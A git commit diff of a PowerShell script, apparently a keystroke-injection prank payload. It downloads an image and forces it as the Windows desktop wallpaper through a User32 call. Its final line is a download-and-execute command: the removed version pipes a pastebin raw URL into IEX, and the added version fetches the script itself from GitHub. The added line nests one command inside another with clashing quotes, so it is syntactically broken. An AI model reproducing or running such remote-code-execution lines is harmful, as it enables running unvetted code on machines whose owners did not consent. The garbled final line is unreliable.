1018fbd31206c1ee4ad942421548d9a32f5b6673
jelpsIT <106605874+jelpsIT@users.noreply.github.com>
2022-11-28 16:14:20 +0000

    Update barrywood.ps1

--- barrywood.ps1
+++ barrywood.ps1
@@ -1,15 +1,15 @@
 $url = 'https://i.ebayimg.com/images/g/1SEAAOSwKcRhL~15/s-l1600.jpg'
 $outpath = "C:\Temp\s-l1600.jpg"
 Invoke-WebRequest -Uri $url -OutFile $outpath
- 
+
 $wc = New-Object System.Net.WebClient
 $wc.DownloadFile($url, $outpath)
 $MyWallpaper = 'C:\Temp\s-l1600.jpg'
- 
+
 Start-Sleep -Seconds 5
- 
+
 function Set-Wallpaper {
- 
+
 param (
     [parameter(Mandatory=$True)]
     # Provide path to image
@@ -21,14 +21,14 @@ param (
 )
  
 $WallpaperStyle = Switch ($Style) {
- 
+  
     "Fill" {"10"}
     "Fit" {"6"}
     "Stretch" {"2"}
     "Tile" {"0"}
     "Center" {"0"}
     "Span" {"22"}
- 
+  
 }
  
 If($Style -eq "Tile") {
@@ -47,7 +47,7 @@ Else {
 Add-Type -TypeDefinition @" 
 using System; 
 using System.Runtime.InteropServices;
- 
+  
 public class Params
 { 
     [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
@@ -57,17 +57,17 @@ public class Params
                                                    Int32 fuWinIni);
 }
 "@ 
- 
+  
     $SPI_SETDESKWALLPAPER = 0x0014
     $UpdateIniFile = 0x01
     $SendChangeEvent = 0x02
- 
+  
     $fWinIni = $UpdateIniFile -bor $SendChangeEvent
- 
+  
     $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 }
  
 Set-WallPaper -Image "C:\Temp\s-l1600.jpg" -Style Tile
- 
- 
-powershell IEX (New-Object Net.WebClient).DownloadString("https://pastebin.com/raw/tswdnmzS")
+
+
+powershell IEX (New-Object Net.WebClient).DownloadString("powershell IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/jelpsIT/duckery/main/barrywood.ps1")")
